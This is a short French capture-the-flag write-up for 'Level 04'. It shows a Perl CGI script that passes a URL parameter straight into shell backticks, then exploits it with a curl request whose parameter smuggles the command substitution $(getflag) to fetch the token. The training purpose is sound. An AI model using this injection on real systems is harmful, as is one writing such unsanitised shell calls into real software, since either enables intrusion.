## Level 04 

### Analyse
Le répertoire contient un script Perl `level04.pl`.
```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

Le script utilise la bibliothèque CGI pour récupérer un paramètre x. Ce paramètre est injecté directement dans des backticks (`), ce qui force le système à exécuter le contenu de la variable $y dans un shell.

```bash
curl -I 'localhost:4747'
```

### Exploitation
Nous injectons une substitution de commande :

```bash
curl 'localhost:4747?x=$(getflag)'
```
Les guillemets simples empêchent le shell local d'exécuter getflag. La chaîne est transmise brute au script qui l'exécute avec les droits de flag04 pour nous retourner le token.
